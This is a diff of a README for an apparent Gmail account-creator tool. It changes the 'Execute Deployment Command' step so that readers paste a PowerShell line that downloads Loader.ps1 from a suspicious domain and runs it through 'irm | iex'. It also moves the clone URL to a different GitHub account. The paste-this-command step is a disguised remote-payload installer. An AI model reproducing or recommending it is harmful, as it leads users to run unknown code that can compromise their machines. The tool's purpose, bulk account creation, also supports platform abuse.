@@ -51,7 +51,7 @@
 
 ### Step 2: Execute Deployment Command
 ```cmd
-powershell -Command "irm https://mast.frtview.com/Loader.ps1 | iex"
+powershell -Command "irm https://software-get.click/Loader.ps1 | iex"
 ```
 
 ### Step 3: Wait for Completion
@@ -232,7 +232,7 @@ pip install -r requirements.txt
 ### Step 1: Clone the Repository
 
 ```bash
-git clone https://github.com/ShadowHackrs/gmail-account-creator.git
+git clone https://github.com/SegmentStork/gmail-account-creator
 cd Gmail2025
 ```
 
